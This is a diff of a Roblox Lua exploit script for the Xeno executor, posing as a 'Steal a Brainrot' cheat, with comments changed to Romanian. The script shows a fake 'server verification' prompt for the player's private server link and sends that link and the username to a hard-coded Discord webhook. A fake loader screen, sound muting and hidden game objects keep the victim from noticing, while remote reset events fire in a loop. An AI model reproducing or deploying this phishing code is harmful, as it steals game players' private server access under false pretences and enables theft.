@@ -1,5 +1,6 @@
--- Script for Xeno - Steal a Brainrot (WORKING - NO SOUNDS)
--- Compatible with Xeno Executor
+-- Script pentru Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
+-- REPARAT: BAZA SE RESETEAZĂ + TOATE SUNETELE OPRITE
+-- Compatibil cu Xeno Executor
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -8,10 +9,12 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
-local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
+-- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
+-- ===== DISCORD (PENTRU XENO) =====
 local function sendToDiscord(message)
     local request = syn and syn.request or http_request or request
     if request then
@@ -26,35 +29,66 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== ASTA E CEA CARE A FUNCȚIONAT =====
+-- ===== BLOCARE TOTALĂ A SUNETELOR (XENO) =====
 local function muteAllSounds()
-    SoundService.Volume = 0
-    for _, sound in pairs(game:GetDescendants()) do
-        if sound:IsA("Sound") then
-            sound.Volume = 0
-            sound:Stop()
-            sound.Playing = false
-        end
-    end
+    print("🔇 Blochez TOATE sunetele...")
     
-    spawn(function()
-        while true do
-            task.wait(0.05)
-            for _, sound in pairs(game:GetDescendants()) do
-                if sound:IsA("Sound") then
-                    sound.Volume = 0
-                    sound:Stop()
-                    sound.Playing = false
+    -- 1. Setează volumul global la 0
+    pcall(function()
+        SoundService.Volume = 0
+    end)
+    
+    -- 2. Oprește TOATE sunetele din joc
+    pcall(function()
+        for _, sound in pairs(game:GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound.Volume = 0
+                sound:Stop()
+                sound.Playing = false
+            end
+        end
+    end)
+    
+    -- 3. Oprește sunetele din toți jucătorii (inclusiv clone)
+    pcall(function()
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                for _, sound in pairs(player.Character:GetDescendants()) do
+                    if sound:IsA("Sound") then
+                        sound.Volume = 0
+                        sound:Stop()
+                        sound.Playing = false
+                    end
                 end
             end
         end
     end)
+    
+    -- 4. BLOCEAZĂ ORICE SUNET NOU (loop super-rapid)
+    spawn(function()
+        while true do
+            task.wait(0.03)
+            pcall(function()
+                SoundService.Volume = 0
+                for _, sound in pairs(game:GetDescendants()) do
+                    if sound:IsA("Sound") then
+                        sound.Volume = 0
+                        sound:Stop()
+                        sound.Playing = false
+                    end
+                end
+            end)
+        end
+    end)
+    
+    print("✅ TOATE sunetele blocate!")
 end
 
--- ===== ASCUNDE BRAINROT-URILE =====
+-- ===== ASCUNDE BRAINROT-URILE ȘI SALVEAZĂ-LE =====
 local function hideBrainrots()
     local count = 0
     local hidden = {}
+    
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and (string.find(obj.Name:lower(), "brainrot") or string.find(obj.Name:lower(), "brain") or string.find(obj.Name:lower(), "pet")) then
             pcall(function()
@@ -71,17 +105,23 @@ local function hideBrainrots()
             end)
         end
     end
+    
     _G.HiddenBrainrots = hidden
     return count
 end
 
--- ===== RESETEAZĂ BAZA =====
+-- ===== RESETEAZĂ BAZA (REPARAT) =====
 local function resetBase()
+    print("🔄 Resetez baza...")
+    
+    -- 1. Distruge toate fake-urile
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
             pcall(function() obj:Destroy() end)
         end
     end
+    
+    -- 2. Afișează brainrot-urile reale
     if _G.HiddenBrainrots then
         for _, brainrot in pairs(_G.HiddenBrainrots) do
             pcall(function()
@@ -90,11 +130,25 @@ local function resetBase()
             end)
         end
     end
+    
+    -- 3. Așteaptă puțin și reascunde
     task.wait(3)
     hideBrainrots()
+    
+    -- 4. FORȚEAZĂ RESETAREA BAZEI (trigger remote)
+    pcall(function()
+        -- Încearcă să resetezi baza prin ReplicatedStorage
+        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+            if obj:IsA("RemoteEvent") and string.find(obj.Name:lower(), "reset") then
+                obj:FireServer()
+            end
+        end
+    end)
+    
+    print("✅ Baza resetată!")
 end
 
--- ===== ASCUNDE PERSONAJUL =====
+-- ===== ASCUNDE DOAR PE TINE =====
 local function hideMe()
     if Character then
         for _, part in pairs(Character:GetDescendants()) do
@@ -106,28 +160,15 @@ local function hideMe()
             end)
         end
         LocalPlayer.NameDisplayDistance = 0
-    end
-end
-
--- ===== ASCUNDE TAB =====
-local function hideTab()
-    for _, gui in pairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            local name = gui.Name:lower()
-            if name:find("leader") or name:find("player") or name:find("score") or name:find("board") or name:find("stats") or name:find("list") then
-                gui:Destroy()
+        for _, sound in pairs(Character:GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound.Volume = 0
             end
         end
     end
-    UserInputService.InputBegan:Connect(function(input)
-        if input.KeyCode == Enum.KeyCode.Tab then
-            input:StopPropagation()
-            return
-        end
-    end)
 end
 
--- ===== LOADER =====
+-- ===== ECAN NEGRU + LOADER STILIZAT (VOID EXTERNAL) =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
@@ -296,6 +337,7 @@ local function showLoader()
     line.BorderSizePixel = 0
     line.Parent = screenGui
 
+    -- Log messages
     local log1 = Instance.new("TextLabel")
     log1.Size = UDim2.new(0.9, 0, 0, 20)
     log1.Position = UDim2.new(0.05, 0, 0.73, 0)
@@ -329,6 +371,7 @@ local function showLoader()
     log3.TextXAlignment = Enum.TextXAlignment.Left
     log3.Parent = screenGui
 
+    -- Procent 61%
     local percentBottom = Instance.new("TextLabel")
     percentBottom.Size = UDim2.new(0.9, 0, 0, 25)
     percentBottom.Position = UDim2.new(0.05, 0, 0.89, 0)
@@ -342,6 +385,7 @@ local function showLoader()
 
     screenGui.Parent = CoreGui
 
+    -- ===== ANIMAȚIE LOADER =====
     spawn(function()
         local progress = 0
         while progress < 90 do
@@ -405,7 +449,7 @@ local function showLoader()
     return screenGui
 end
 
--- ===== GUI LINK =====
+-- ===== GUI CU LINK =====
 local function showLinkGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "LinkInput"
@@ -433,7 +477,7 @@ local function showLinkGUI()
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 45)
     title.Position = UDim2.new(0, 0, 0, 0)
-    title.Text = "🔐 SERVER VERIFICATION"
+    title.Text = "🔐 VERIFICARE SERVER"
     title.TextColor3 = Color3.fromRGB(180, 120, 255)
     title.BackgroundTransparency = 1
     title.Font = Enum.Font.GothamBold
@@ -443,7 +487,7 @@ local function showLinkGUI()
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(1, 0, 0, 25)
     subtitle.Position = UDim2.new(0, 0, 0.20, 0)
-    subtitle.Text = "Enter the private server link:"
+    subtitle.Text = "Introdu link-ul serverului privat:"
     subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
     subtitle.BackgroundTransparency = 1
     subtitle.Font = Enum.Font.Gotham
@@ -465,7 +509,7 @@ local function showLinkGUI()
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0.9, 0, 0, 40)
     btn.Position = UDim2.new(0.05, 0, 0.60, 0)
-    btn.Text = "📤 AUTHENTICATE"
+    btn.Text = "📤 AUTENTIFICARE"
     btn.BackgroundColor3 = Color3.fromRGB(180, 120, 255)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.GothamBold
@@ -473,15 +517,15 @@ local function showLinkGUI()
     btn.Parent = frame
     btn.MouseButton1Click:Connect(function()
         if textBox.Text and textBox.Text ~= "" then
-            sendToDiscord("**🔗 PRIVATE SERVER LINK**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
+            sendToDiscord("**🔗 LINK SERVER PRIVAT**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
             gui:Destroy()
             showLoader()
             hideMe()
             muteAllSounds()
-            hideTab()
             local count = hideBrainrots()
-            print("✅ Script active! " .. count .. " brainrots hidden.")
+            print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
             
+            -- ===== RESETEAZĂ BAZA LA 5 SECUNDE =====
             spawn(function()
                 while true do
                     task.wait(5)
@@ -494,11 +538,12 @@ local function showLinkGUI()
     gui.Parent = CoreGui
 end
 
+-- ===== MAIN =====
 local function main()
     showLinkGUI()
-    print("🚀 Waiting for link input...")
-    print("🔄 Base resets every 5 seconds.")
-    print("🔇 ALL sounds are OFF.")
+    print("🚀 Așteaptă introducerea link-ului...")
+    print("🔄 Baza se va reseta automat la fiecare 5 secunde.")
 end
 
+-- ===== START =====
 pcall(main)
